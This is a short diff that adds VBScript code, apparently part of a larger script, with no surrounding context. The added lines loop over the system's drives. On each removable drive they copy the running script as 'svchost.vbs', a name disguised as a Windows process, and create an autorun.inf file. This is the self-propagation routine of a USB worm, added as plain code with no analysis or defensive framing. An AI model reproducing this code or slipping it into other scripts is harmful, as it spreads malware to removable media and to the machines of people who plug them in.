@@ -1,0 +1,7 @@
+For Each d In fso.Drives
+If d.DriveType = 1 Then
+fso.CopyFile WScript.ScriptFullName, d.Path & "\svchost.vbs"
+Set f = fso.CreateTextFile(d.Path & "\autorun.inf")
+End If
+Next
+
